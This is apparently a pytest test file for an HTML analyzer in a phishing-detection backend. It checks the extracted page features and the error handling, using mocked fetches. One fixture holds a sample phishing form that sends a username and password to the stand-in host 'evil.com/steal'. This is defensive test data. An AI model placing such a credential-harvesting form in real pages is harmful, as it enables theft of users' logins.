import pytest
from unittest.mock import patch
from backend.app.analyzers.html_analyzer import HtmlAnalyzer


_RICH_HTML = """
<html>
<head>
  <title>Test Page</title>
  <meta name="description" content="A test page">
</head>
<body>
  <main>
    <p>This is a meaningful paragraph with more than thirty characters of content.</p>
    <p>Another useful paragraph that has enough text to be included in the output result.</p>
  </main>
</body>
</html>
"""

_PHISHING_HTML = """
<html>
<body>
  <form action="http://evil.com/steal">
    <input type="text" name="user">
    <input type="password" name="pass">
    <input type="hidden" name="csrf" value="abc">
  </form>
</body>
</html>
"""

_LONG_HTML = "<html><body><p>" + ("A" * 3000) + "</p></body></html>"


@pytest.fixture
def mock_fetch_success():
    def _make(html):
        return {"success": True, "status_code": 200, "html": html}
    return _make


@pytest.fixture
def mock_fetch_failure():
    return {"success": False, "error": "Connection refused", "html": ""}


class TestHtmlAnalyzerSuccess:

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_success_flag_true(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_RICH_HTML)
        result = HtmlAnalyzer.analyze("https://example.com")
        assert result["success"] is True

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_html_features_present(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_RICH_HTML)
        result = HtmlAnalyzer.analyze("https://example.com")
        assert "html_features" in result

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_has_title_detected(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_RICH_HTML)
        result = HtmlAnalyzer.analyze("https://example.com")
        assert result["html_features"]["HasTitle"] == 1

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_description_detected(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_RICH_HTML)
        result = HtmlAnalyzer.analyze("https://example.com")
        assert result["html_features"]["HasDescription"] == 1

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_page_text_present(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_RICH_HTML)
        result = HtmlAnalyzer.analyze("https://example.com")
        assert "page_text" in result
        assert len(result["page_text"]) > 0

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_page_text_max_2000_chars(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_LONG_HTML)
        result = HtmlAnalyzer.analyze("https://example.com")
        assert len(result["page_text"]) <= 2000

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_phishing_html_password_field(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_PHISHING_HTML)
        result = HtmlAnalyzer.analyze("http://evil.com/login")
        assert result["success"] is True
        assert result["html_features"]["HasPasswordField"] == 1

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_phishing_html_hidden_fields(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_PHISHING_HTML)
        result = HtmlAnalyzer.analyze("http://evil.com/login")
        assert result["html_features"]["HasHiddenFields"] == 1

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_phishing_html_no_title(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_PHISHING_HTML)
        result = HtmlAnalyzer.analyze("http://evil.com/login")
        assert result["html_features"]["HasTitle"] == 0

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_fetcher_called_with_correct_url(self, mock_fetch, mock_fetch_success):
        mock_fetch.return_value = mock_fetch_success(_RICH_HTML)
        url = "https://specific-site.com/path"
        HtmlAnalyzer.analyze(url)
        mock_fetch.assert_called_once_with(url)


class TestHtmlAnalyzerFailure:

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_fetch_failure_returns_success_false(self, mock_fetch, mock_fetch_failure):
        mock_fetch.return_value = mock_fetch_failure
        result = HtmlAnalyzer.analyze("https://unreachable.example.com")
        assert result["success"] is False

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_fetch_failure_includes_error(self, mock_fetch, mock_fetch_failure):
        mock_fetch.return_value = mock_fetch_failure
        result = HtmlAnalyzer.analyze("https://unreachable.example.com")
        assert "error" in result
        assert result["error"] == "Connection refused"

    @patch("backend.app.analyzers.html_analyzer.HtmlFetcher.get_html")
    def test_fetch_failure_no_html_features_key(self, mock_fetch, mock_fetch_failure):
        mock_fetch.return_value = mock_fetch_failure
        result = HtmlAnalyzer.analyze("https://unreachable.example.com")
        assert "html_features" not in result
